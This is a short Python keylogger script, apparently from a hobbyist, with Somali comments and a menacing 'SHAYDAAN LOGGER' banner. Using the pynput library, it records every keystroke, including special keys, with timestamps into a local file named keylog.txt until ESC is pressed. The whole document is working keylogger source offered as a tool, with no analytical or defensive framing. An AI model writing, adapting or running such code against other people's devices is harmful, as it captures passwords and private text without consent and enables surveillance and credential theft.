import os
import pynput
from pynput.keyboard import Key, Listener
import logging

# Nadiifi Terminal-ka Termux
def clear_terminal():
    os.system('clear')  # Termux iyo Linux waxay isticmaalaan 'clear'

# ASCII Qurux badan oo cabsi leh
def show_banner():
    banner = """
       ██████╗ ███████╗███████╗ █████╗ ███╗   ██╗
      ██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
      ██║   ██║███████╗█████╗  ███████║██╔██╗ ██║
      ██║   ██║╚════██║██╔══╝  ██╔══██║██║╚██╗██║
      ╚██████╔╝███████║███████╗██║  ██║██║ ╚████║
       ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                 SHAYDAAN LOGGER
        [!!] BEWARE - CODE BY POP-SMOKE [!!]
    """
    print(f"\033[31m{banner}\033[0m")  # Red color for the banner

# Set up logging
logging.basicConfig(
    filename='keylog.txt',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# Key logging functions
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        if key == Key.space:
            logging.info(' [SPACE] ')
        elif key == Key.enter:
            logging.info(' [ENTER] ')
        elif key == Key.tab:
            logging.info(' [TAB] ')
        elif key == Key.backspace:
            logging.info(' [BACKSPACE] ')
        elif key == Key.shift:
            logging.info(' [SHIFT] ')
        elif key == Key.ctrl:
            logging.info(' [CTRL] ')
        elif key == Key.alt:
            logging.info(' [ALT] ')
        else:
            logging.info(f' [SPECIAL KEY: {key}] ')

def on_release(key):
    if key == Key.esc:
        print("\033[32m[INFO]\033[0m ESC pressed. Exiting keylogger...")
        return False

# Main program
if __name__ == "__main__":
    clear_terminal()
    show_banner()
    print("\033[33m[INFO]\033[0m Keylogger is running... Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
